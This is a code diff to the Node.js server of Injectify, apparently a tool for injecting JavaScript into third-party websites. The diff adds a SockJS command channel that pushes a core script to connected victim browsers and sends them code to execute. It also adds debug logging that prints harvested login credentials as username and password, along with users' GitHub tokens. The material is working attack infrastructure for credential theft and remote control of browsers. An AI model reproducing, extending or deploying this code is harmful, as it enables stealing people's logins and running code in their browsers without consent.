@@ -1,6 +1,6 @@
 // Configuration
 const config = {
-	debug 	: false,
+	debug 	: true,
 	mongodb : 'mongodb://localhost:19000/injectify',
 	express : 3000,
 	dev		: process.env.NODE_ENV.toUpperCase() == 'DEVELOPMENT',
@@ -20,19 +20,27 @@ const express 		= require('express')
 const app 	 		= express()
 const server 		= app.listen(config.express)
 const io 			= require('socket.io').listen(server)
+const sockjs		= require('sockjs')
+const injector		= sockjs.createServer()
 const path 			= require('path')
 const request 		= require('request')
 const {URL}			= require('url')
 const chalk 		= require('chalk')
+const fs			= require('fs')
 const atob			= require('atob')
 const btoa			= require('btoa')
 const beautify		= require('js-beautify').js_beautify
-const UglifyJS		= require("uglify-js")
+const UglifyJS		= require("uglify-es")
 const ObfuscateJS	= require('js-obfuscator')
 const reverse		= require('reverse-string')
 const escapeUTF8	= require('unicode-escape')
 const parseAgent	= require('user-agent-parser')
 const me			= require('mongo-escape').escape
+
+const inject = {
+	core: 'injectify=' + UglifyJS.minify(fs.readFileSync('./inject/core.js', 'utf8')).code,
+	clients : []
+}
 
 console.log(chalk.greenBright("[Injectify] ") + "listening on port " + config.express)
 
@@ -357,10 +365,13 @@ MongoClient.connect(config.mongodb, function(err, db) {
 
 		socket.on('auth:github', data => {
 			if (data.code) {
-				if (config.debug) console.log(chalk.greenBright("[websocket] ") + chalk.yellowBright("client => github:auth "), data);
 				// Convert the code into a user-token
 				getToken(data.code).then(token => {
-					if (config.debug) console.log(chalk.greenBright("[GitHub] ") + chalk.yellowBright("retrieved token "), token);
+					if (config.debug) console.log(
+						chalk.greenBright("[GitHub] ") +
+						chalk.yellowBright("retrieved token ") +
+						chalk.magentaBright(token)
+					)
 					// Convert the token into a user object
 					getUser(token).then(user => {
 						globalToken = token
@@ -369,7 +380,12 @@ MongoClient.connect(config.mongodb, function(err, db) {
 							token: token,
 							user: user
 						})
-						if (config.debug) console.log(chalk.greenBright("[websocket] ") + chalk.yellowBright("client <= github:auth "), user);
+						if (config.debug) console.log(
+							chalk.greenBright("[GitHub] ") +
+							chalk.yellowBright("authenticated user ") +
+							chalk.magentaBright(user.id) +
+							chalk.cyanBright(" (" + user.login + ")")
+						)
 						// Add the user to the database if they don't exist
 						login(user, token, "manual").then(() => {
 							getProjects(user).then(projects => {
@@ -417,7 +433,12 @@ MongoClient.connect(config.mongodb, function(err, db) {
 						token: token,
 						user: user
 					})
-					if (config.debug) console.log(chalk.greenBright("[websocket] ") + chalk.yellowBright("client <= github:auth "), user);
+					if (config.debug) console.log(
+						chalk.greenBright("[GitHub] ") +
+						chalk.yellowBright("authenticated user ") +
+						chalk.magentaBright(user.id) +
+						chalk.cyanBright(" (" + user.login + ")")
+					)
 					// Add the user to the database if they don't exist
 					login(user, token, "automatic").then(() => {
 						getProjects(user).then(projects => {
@@ -927,6 +948,102 @@ MongoClient.connect(config.mongodb, function(err, db) {
 		})
 	})
 
+	injector.on('connection', socket => {
+		let checkIfValid = socket => {
+			return new Promise((resolve, reject) => {
+				let project = socket.url.split('?')
+				project = project[project.length - 1]
+				if (!project) {
+					reject('websocket connection with invalid / missing project name, terminating')
+					return
+				}
+				db.collection('projects', (err, projects) => {
+					if (err) throw err
+					projects.findOne({
+						"name": atob(project)
+					}).then(doc => {
+						if(doc == null) {
+							reject('websocket connection to nonexistent project, terminating')
+						} else {
+							resolve({
+								project : doc.name,
+								id      : + new Date()
+							})
+						}
+					})
+				})
+			})
+		}
+		let send = (topic, data) => {
+			socket.write(
+				JSON.stringify({
+					t: topic,
+					d: data,
+				})
+			)
+		}
+		checkIfValid(socket).then(data => {
+			if (config.debug) console.log(
+				chalk.greenBright("[inject] ") + 
+				chalk.yellowBright("new websocket connection for project ") +
+				chalk.magentaBright(data.project)
+			)
+			inject.clients.push({
+				id      : data.id,
+				project : data.project,
+				socket  : socket,
+			})
+			send('core', inject.core)
+			send('execute', 'injectify.send("d")')
+
+			socket.on('data', rawData => {
+				try {rawData = JSON.parse(rawData);if (!rawData.t && !rawData.d) return} catch(e) {return}
+				let on = (topic, callback) => {
+					if (topic !== rawData.t) return
+					callback(rawData.d)
+				}
+				
+				on('e', data => { // error
+					//send('x', 'console.error("' + data.replace(/([/'"])/g, "/$1") + '")')
+					console.log(data)
+				})
+
+				on('r', data => { // response
+					console.log(data)
+				})
+
+				on('ping', data => {
+					let difference = + new Date() - data
+					send('pong', difference)
+				})
+
+				on('d', data => { // data
+					send('x',
+						`/*injectify.listen('message', data => {
+							console.error(data)
+						})*/
+
+						injectify.send('message', {
+							test: true
+						})
+						`)
+				})
+
+			})
+			socket.on('close', function() {
+				inject.clients = inject.clients.filter(client => client.id !== data.id)
+			})
+		}).catch(error => {
+			if (config.debug) console.log(
+				chalk.redBright("[inject] ") + 
+				chalk.yellowBright(error)
+			)
+			return
+		})
+	})
+
+	injector.installHandlers(server, { prefix: '/inject' })
+
 	app.get('/record/*', (req, res) => {
 		let headers = req.headers
 		if (req.headers['forwarded-headers']) {
@@ -988,7 +1105,11 @@ MongoClient.connect(config.mongodb, function(err, db) {
 										allowed = true
 									doc.config.filter.domains.forEach(domain => {
 										if (domain.enabled == false) return
-										domain = new URL(domain.match)
+										try {
+											domain = new URL(domain.match)
+										} catch(e) {
+											return
+										}
 										if (doc.config.filter.type.toLowerCase() == "whitelist") {
 											// Whitelist
 											if (domain.host == referer.host) allowed = true
@@ -1067,6 +1188,15 @@ MongoClient.connect(config.mongodb, function(err, db) {
 												}
 											}
 										}).then(() => {
+											if (config.debug) console.log(
+												chalk.greenBright("[Record] ") +
+												chalk.yellowBright("recorded login ") +
+												chalk.magentaBright(record[username]) +
+												chalk.yellowBright(":") +
+												chalk.magentaBright(record[password]) +
+												chalk.yellowBright(" for project ") +
+												chalk.cyanBright(record[project])
+											)
 											resolve("wrote record to database")
 										})
 									} else if (record[type] == 1) {
@@ -1183,7 +1313,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				)
 			})
 		}).catch(error => {
-			if (config.debug) console.log(chalk.redBright("[record] ") + chalk.yellowBright(error));
+			if (config.debug) console.log(chalk.redBright("[record] ") + chalk.yellowBright(error))
 		})
 	})
 
@@ -1597,6 +1727,11 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				})
 			)
 		}
+		if (config.debug) console.log(
+			chalk.greenBright("[Payload] ") +
+			chalk.yellowBright("generated for project ") +
+			chalk.magentaBright(req.query.project)
+		)
 	})
 
 	if (config.dev) {
@@ -1609,6 +1744,12 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				let hotUpdate = req.originalUrl.split("/")
 					hotUpdate = hotUpdate[hotUpdate.length - 1]
 				request("http://localhost:8080/" + hotUpdate).pipe(res)
+				return
+			}	
+			if (req.originalUrl.includes("/vs/")) {
+				let vs = req.originalUrl.split('/vs/')
+					vs = vs[vs.length - 1]
+				request("http://localhost:8080/vs/" + vs).pipe(res)
 				return
 			}
 			request("http://localhost:8080" + req.originalUrl.substring(9), (error, response) => {
